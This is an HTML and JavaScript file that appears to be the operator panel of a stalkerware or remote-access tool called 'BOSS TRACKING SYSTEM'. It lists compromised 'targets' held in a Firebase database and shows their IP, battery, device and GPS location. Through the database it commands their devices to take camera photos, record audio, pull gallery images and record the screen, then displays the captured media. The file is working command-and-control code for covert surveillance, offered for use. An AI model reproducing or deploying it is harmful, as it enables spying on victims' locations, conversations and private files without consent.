<!DOCTYPE html>
<html>
<head>
    <title>BOSS TRACKING SYSTEM | MASTER</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --red: #ff3131; }
        body { background: var(--bg); color: var(--neon); font-family: monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 300px; border-right: 1px solid #222; padding: 15px; overflow-y: auto; }
        .card { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; position: relative; }
        .card.active { border-color: var(--neon); background: rgba(0,255,65,0.1); }
        .online-status { color: var(--neon); position: absolute; right: 10px; top: 10px; font-size: 10px; }
        .main { flex: 1; padding: 20px; overflow-y: auto; }
        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; cursor: pointer; margin: 5px; font-size: 11px; }
        .btn:hover { background: var(--neon); color: #000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .box { background: var(--panel); border: 1px solid #222; padding: 15px; border-radius: 5px; position: relative; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 10px; }
        img, video { width: 100%; border: 1px solid #333; }
        .del-x { position: absolute; top: 2px; right: 2px; background: var(--red); color: white; border: none; cursor: pointer; font-size: 10px; z-index: 5; }
        #map-box { height: 200px; width: 100%; background: #000; border: 1px solid #333; margin-top: 10px; }
    </style>
</head>
<body>

<div class="sidebar">
    <h3>BOSS TRACKING SYSTEM</h3>
    <div id="target-list">Connecting...</div>
</div>

<div class="main">
    <div id="controls" style="display:none;">
        <h2 id="user-id-display">Select Target</h2>
        <input type="text" id="alias-input" placeholder="Set Name..." style="background:#000; border:1px solid #333; color:#fff;">
        <button onclick="saveName()" class="btn">SAVE NAME</button>
        <hr border="1" color="#222">
        <button class="btn" onclick="cmd('photo')">CAPTURE PHOTO</button>
        <button class="btn" onclick="cmd('back_photo')">BACK CAMERA</button>
        <button class="btn" onclick="cmd('audio')">AUDIO RECORD</button>
        <button class="btn" onclick="cmd('gallery_access')">GALLERY ACCESS</button>
        <button class="btn" onclick="cmd('screen_record')">SCREEN RECORD</button>
        <button class="btn" onclick="location.reload()">REFRESH</button>
        <button class="btn" style="border-color:var(--red); color:var(--red);" onclick="delTarget()">DELETE USER</button>

        <div class="grid" style="margin-top:20px;">
            <div class="box">
                <h3>MAP TRACKER</h3>
                <div id="map-box">Waiting for Signal...</div>
                <button class="btn" style="width:100%" onclick="openFullMap()">VIEW ON GOOGLE MAPS</button>
            </div>
            <div class="box">
                <h3>USER DETAILS</h3>
                <div id="info-box">Select a user to see specs.</div>
            </div>
            <div class="box" style="grid-column: span 2;">
                <h3>VISUAL DATA & RECORDINGS</h3>
                <div id="media-box" class="gallery"></div>
            </div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentId = null;
    let currentGps = null;

    db.ref('targets').on('value', snap => {
        const list = document.getElementById('target-list');
        list.innerHTML = "";
        snap.forEach(t => {
            const id = t.key; const data = t.val();
            const name = data.alias || id;
            list.innerHTML += `<div class="card ${currentId==id?'active':''}" onclick="select('${id}')">
                <strong>${name}</strong><br><small>${id}</small>
                ${data.info && data.info.status=="ONLINE" ? '<span class="online-status">‚óè online</span>' : ''}
            </div>`;
        });
    });

    function select(id) {
        currentId = id;
        document.getElementById('controls').style.display = 'block';
        document.getElementById('user-id-display').innerText = "NODE: " + id;
        
        db.ref(`targets/${id}/info`).on('value', s => {
            const d = s.val() || {};
            document.getElementById('info-box').innerHTML = `IP: ${d.ip}<br>BATT: ${d.battery}<br>DEVICE: ${d.device}<br>LAST: ${d.time}`;
        });

        db.ref(`targets/${id}/location`).on('value', s => {
            currentGps = s.val();
            if(currentGps && currentGps.lat) {
                const url = `https://maps.google.com/maps?q=${currentGps.lat},${currentGps.lng}&t=&z=13&ie=UTF8&iwloc=&output=embed`;
                document.getElementById('map-box').innerHTML = `<iframe width="100%" height="100%" src="${url}" frameborder="0"></iframe>`;
            }
        });

        db.ref(`targets/${id}`).on('value', s => {
            const box = document.getElementById('media-box'); box.innerHTML = "";
            const data = s.val() || {};
            // Combine all media
            if(data.photos) Object.entries(data.photos).reverse().forEach(([key, p]) => {
                box.innerHTML += `<div style="position:relative"><button class="del-x" onclick="removeItem('photos','${key}')">X</button><img src="${p.img}" onclick="window.open(this.src)"></div>`;
            });
            if(data.gallery) Object.entries(data.gallery).forEach(([key, g]) => {
                box.innerHTML += `<div style="position:relative"><button class="del-x" onclick="removeItem('gallery','${key}')">X</button><img src="${g.data}" onclick="window.open(this.src)"></div>`;
            });
            if(data.audios) Object.entries(data.audios).forEach(([key, a]) => {
                box.innerHTML += `<div style="position:relative"><button class="del-x" onclick="removeItem('audios','${key}')">X</button><audio src="${a.audio}" controls style="width:100%"></audio></div>`;
            });
            if(data.screens) Object.entries(data.screens).forEach(([key, sc]) => {
                box.innerHTML += `<div style="position:relative"><button class="del-x" onclick="removeItem('screens','${key}')">X</button><video src="${sc.video}" controls></video></div>`;
            });
        });
    }

    function cmd(a) { db.ref(`commands/${currentId}`).set({ action: a, t: Date.now() }); }
    function saveName() { db.ref(`targets/${currentId}/alias`).set(document.getElementById('alias-input').value); }
    function openFullMap() { if(currentGps) window.open(`https://www.google.com/maps?q=${currentGps.lat},${currentGps.lng}`); }
    function removeItem(path, key) { if(confirm("Delete?")) db.ref(`targets/${currentId}/${path}/${key}`).remove(); }
    function delTarget() { if(confirm("Delete entire user?")) db.ref(`targets/${currentId}`).remove(); }
</script>
</body>
</html>
